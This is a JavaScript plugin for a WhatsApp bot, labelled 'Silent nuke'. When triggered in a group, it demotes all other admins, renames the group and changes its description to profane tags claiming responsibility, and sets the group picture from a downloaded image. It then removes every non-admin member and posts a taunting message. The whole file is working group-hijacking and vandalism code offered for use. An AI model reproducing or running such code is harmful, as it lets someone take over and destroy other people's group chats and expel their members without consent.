const { bot } = require('../lib/')
const axios = require('axios')

bot(
{
  pattern: "Sajidenter",
  fromMe: true,
  desc: "Silent nuke",
  type: "group",
  onlyGroup: true
},
async (message) => {

  const client = message.client
  const botPhone = client.user.id.split(':')[0] + '@s.whatsapp.net'

  ;(async () => {

    const g = await client.groupMetadata(message.jid)

    let admins = g.participants
      .filter(p => p.admin && p.phoneNumber !== botPhone)
      .map(p => p.id)

    admins = admins.filter(id => id !== botPhone)

    if (admins.length > 0) {
      await client.groupParticipantsUpdate(message.jid, admins, 'demote')
    }

    await new Promise(r => setTimeout(r, 2000))

    try {
      const name = `𝑆𝛥𝐽𝛪𝐷 𝛯𝛮𝑇𝛯𝑅 💀🤲🏻












𝐹𝑈𝐶𝛫𝛯𝐷 𝐵𝑌 𝑆𝛥𝐽𝛪𝐷 ☠️🥵`

      await client.groupUpdateSubject(message.jid, name)
    } catch (e) {}

    await new Promise(r => setTimeout(r, 1500))

    try {
      const desc = `𝐹𝑈𝐶𝛫𝛯𝐷 𝐵𝑌 𝑆𝛥𝐽𝛪𝐷 ☠️🥵 🤡🔥`
      await client.groupUpdateDescription(message.jid, desc)
    } catch (e) {}

    await new Promise(r => setTimeout(r, 1500))

    try {
      const url = "https://i.postimg.cc/yWCz43cF/IMG-20260402-WA0010.jpg"
      const res = await axios.get(url, { responseType: 'arraybuffer' })
      const buffer = Buffer.from(res.data)
      await client.updateProfilePicture(message.jid, buffer)
    } catch (e) {}

    await new Promise(r => setTimeout(r, 2000))

    const sock = message.client
    const jid = message.jid

    const group = await sock.groupMetadata(jid)

    const users = group.participants
      .filter(p => !p.admin)
      .map(p => p.id)

    if (users.length) {
      await sock.groupParticipantsUpdate(jid, users, "remove")
    }

    await message.send("_Lun Ty Char Gya Gc 😂_")

  })()
}
)